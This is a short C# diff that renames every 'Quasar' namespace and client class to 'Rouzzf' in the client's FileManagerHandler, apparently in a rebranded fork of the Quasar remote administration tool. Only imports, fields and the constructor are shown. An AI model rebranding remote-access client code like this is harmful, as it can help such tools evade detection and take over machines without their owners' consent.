@@ -1,12 +1,12 @@
-﻿using Quasar.Client.Networking;
-using Quasar.Common;
-using Quasar.Common.Enums;
-using Quasar.Common.Extensions;
-using Quasar.Common.Helpers;
-using Quasar.Common.IO;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.Networking;
+using Rouzzf.Common;
+using Rouzzf.Common.Enums;
+using Rouzzf.Common.Extensions;
+using Rouzzf.Common.Helpers;
+using Rouzzf.Common.IO;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Models;
+using Rouzzf.Common.Networking;
 using System;
 using System.Collections.Concurrent;
 using System.IO;
@@ -14,20 +14,20 @@ using System.Linq;
 using System.Security;
 using System.Threading;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class FileManagerHandler : NotificationMessageProcessor, IDisposable
     {
         private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
         private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
 
-        private readonly QuasarClient _client;
+        private readonly RouzzfClient _client;
 
         private CancellationTokenSource _tokenSource;
 
         private CancellationToken _token;
 
-        public FileManagerHandler(QuasarClient client)
+        public FileManagerHandler(RouzzfClient client)
         {
             _client = client;
             _client.ClientState += OnClientStateChange;
